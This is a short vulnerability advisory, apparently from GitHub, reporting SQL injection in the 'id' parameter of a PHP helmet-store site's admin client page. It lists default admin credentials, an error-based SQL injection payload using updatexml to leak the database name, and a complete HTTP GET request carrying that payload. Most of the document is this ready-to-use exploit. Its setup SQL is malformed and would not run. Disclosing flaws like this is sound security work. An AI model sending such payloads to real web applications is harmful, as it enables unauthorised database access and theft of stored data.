# Helmet Store Showroom Site v1.0 by oretnom23 has SQL injection

BUG_Author: HMHYHM

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/15851/helmet-store-showroom-site-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

First execute the following sql statement in the database to create the clients table

```sql
CREATE TABLE `clients` (
  `id` int(11) NOT NULL,
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
COMMIT;
```

Vulnerability File: /hss/admin/?page=client/manage_client&id=

Vulnerability location: /hss/admin/?page=client/manage_client&id=,id

dbname =hss_db,length=6

[+] Payload:  /hss/admin/?page=client/manage_client&id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> id


```sql
GET /hss/admin/?page=client/manage_client&id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=29mcgvmjo6mqsepd64ra2rlt4v
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/204069901-9bea3c9d-bc0d-47e6-b1cd-d8e443f46b45.png)
